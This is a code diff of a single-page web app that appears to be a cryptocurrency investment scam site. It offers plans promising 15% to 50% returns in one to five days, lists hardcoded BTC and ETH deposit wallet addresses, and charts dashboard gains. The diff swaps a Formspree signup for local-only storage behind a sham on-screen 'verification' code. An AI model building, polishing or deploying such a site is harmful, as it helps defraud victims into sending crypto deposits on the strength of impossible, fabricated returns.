@@ -86,7 +86,7 @@
 <div class="container my-5" id="signup-section" style="max-width: 400px; display:none;">
   <div class="card p-4 shadow-sm">
     <h3 class="mb-3">Sign Up</h3>
-    <form id="signupForm" action="https://formspree.io/f/xzzgqebn" method="POST">
+    <form id="signupForm">
       <div id="signup-fields">
         <div class="mb-3">
           <label for="signup-fullname" class="form-label">Full Name</label>
@@ -107,7 +107,7 @@
           <input type="text" id="verification-code" class="form-control" placeholder="Enter code here" />
           <div id="verification-error" class="text-danger mt-2 d-none">Incorrect code. Please try again.</div>
         </div>
-        <button type="button" id="verify-btn" class="btn btn-primary w-100">Verify & Submit</button>
+        <button type="button" id="verify-btn" class="btn btn-primary w-100">Verify</button>
       </div>
     </form>
     <div class="mt-3 text-center">
@@ -207,12 +207,14 @@ let signupVerificationCode = null;
 let signupData = null;
 let investmentChart = null;
 
+// Investment plans with very short durations
 const investmentPlans = [
   { id: 'plan-basic', name: 'Basic Plan', minInvestment: 100, maxInvestment: 1000, durationDays: 1, interestRate: 15, description: 'A low-risk plan with steady returns over 1 day.' },
   { id: 'plan-standard', name: 'Standard Plan', minInvestment: 1000, maxInvestment: 5000, durationDays: 3, interestRate: 30, description: 'Balanced plan with moderate risk and higher returns over 3 days.' },
   { id: 'plan-premium', name: 'Premium Plan', minInvestment: 5000, maxInvestment: 20000, durationDays: 5, interestRate: 50, description: 'High-return plan for experienced investors over 5 days.' }
 ];
 
+// Wallet addresses and network info
 const walletAddresses = {
   BTC: { address: '16ev7k4nfetAWkFDvmS6iPDhthujpFJQ4P', network: 'Bitcoin' },
   ETH: { address: '0xced6ec6ec624b561483822768b8af6bad3777aee', network: 'Ethereum (ERC20)' },
@@ -320,6 +322,7 @@ function renderDashboard() {
     document.getElementById('total-invested').innerText = `$${totalInvested.toFixed(2)}`;
     document.getElementById('current-value').innerText = `$${(totalInvested + totalReturns).toFixed(2)}`;
     document.getElementById('total-returns').innerText = `$${totalReturns.toFixed(2)}`;
+    // Chart
     const chartLabels = [], chartValues = [];
     const now = new Date();
     for(let i = 29; i >= 0; i--) {
@@ -527,28 +530,21 @@ function openInvestModal(planId) {
     renderDashboard();
   });
 }
-
-// --- Signup Form Verification and Formspree AJAX Submission ---
 document.getElementById('signupForm').addEventListener('submit', function(e) {
-  if (!document.getElementById('verification-section').classList.contains('d-none')) {
-    e.preventDefault();
-    return;
-  }
+  e.preventDefault();
+  if (!document.getElementById('verification-section').classList.contains('d-none')) return;
   const form = e.target;
   const fullName = form.fullName.value.trim();
   const email = form.email.value.trim().toLowerCase();
-  if (!fullName || !email) {
-    alert("Please fill in all required fields.");
-    e.preventDefault();
-    return;
-  }
+  if (!fullName || !email) { alert("Please fill in all required fields."); return; }
+  const users = getUsers();
+  if (users[email]) { alert("Email already registered."); return; }
   signupVerificationCode = Math.floor(100000 + Math.random() * 900000).toString();
   signupData = { fullName, email };
   document.getElementById('displayVerificationCode').innerText = signupVerificationCode;
   document.getElementById('signup-fields').classList.add('d-none');
   document.getElementById('verification-section').classList.remove('d-none');
   document.getElementById('verification-error').classList.add('d-none');
-  e.preventDefault();
 });
 document.getElementById('copyCodeBtn').addEventListener('click', () => {
   if (!signupVerificationCode) return;
@@ -561,48 +557,36 @@ document.getElementById('copyCodeBtn').addEventListener('click', () => {
     alert("Failed to copy. Please copy the code manually: " + signupVerificationCode);
   });
 });
-document.getElementById('verify-btn').addEventListener('click', function() {
+document.getElementById('verify-btn').addEventListener('click', async () => {
   const inputCode = document.getElementById('verification-code').value.trim();
   if (inputCode !== signupVerificationCode) {
     document.getElementById('verification-error').classList.remove('d-none');
     return;
   }
   document.getElementById('verification-error').classList.add('d-none');
-  // Prepare form data for Formspree
-  const formData = new FormData();
-  formData.append('fullName', signupData.fullName);
-  formData.append('email', signupData.email);
-  fetch('https://formspree.io/f/xzzgqebn', {
-    method: 'POST',
-    body: formData,
-    headers: { 'Accept': 'application/json' }
-  })
-  .then(response => {
-    if (response.ok) {
-      const users = getUsers();
-      users[signupData.email] = { fullName: signupData.fullName, verified: true };
-      saveUsers(users);
-      setCurrentUser(signupData.email);
-      currentUser = signupData.email;
-      renderNav();
-      document.getElementById('signupForm').reset();
-      signupVerificationCode = null;
-      signupData = null;
-      document.getElementById('verification-section').classList.add('d-none');
-      document.getElementById('signup-fields').classList.remove('d-none');
-      navigateTo('dashboard');
-    } else {
-      response.json().then(data => {
-        alert(data.errors ? data.errors.map(e => e.message).join(", ") : 'Submission failed.');
-      });
-    }
-  })
-  .catch(() => {
-    alert('Submission failed. Please try again later.');
-  });
+  if (!signupData?.fullName || !signupData?.email) {
+    alert("Signup data missing. Please try again.");
+    return;
+  }
+  try {
+    const users = getUsers();
+    users[signupData.email] = { fullName: signupData.fullName, verified: true };
+    saveUsers(users);
+    setCurrentUser(signupData.email);
+    currentUser = signupData.email;
+    renderNav();
+    navigateTo('dashboard');
+    document.getElementById('signupForm').reset();
+    signupVerificationCode = null;
+    signupData = null;
+    document.getElementById('verification-section').classList.add('d-none');
+    document.getElementById('signup-fields').classList.remove('d-none');
+    alert('Thank you for signing up! You are now logged in.');
+  } catch (error) {
+    alert('Signup failed. Please try again later.');
+    console.error(error);
+  }
 });
-
-// --- Login and Navigation ---
 document.getElementById('loginForm').addEventListener('submit', function(e) {
   e.preventDefault();
   const email = document.getElementById('login-email').value.trim().toLowerCase();
